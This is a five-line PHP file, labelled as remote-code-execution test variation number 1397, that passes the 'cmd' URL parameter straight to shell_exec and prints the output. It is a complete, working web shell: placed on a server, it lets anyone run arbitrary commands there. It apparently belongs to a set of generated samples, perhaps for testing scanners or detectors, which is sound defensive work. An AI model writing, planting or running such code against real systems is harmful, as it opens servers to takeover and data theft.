<?php
// RCE test variation #1397
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>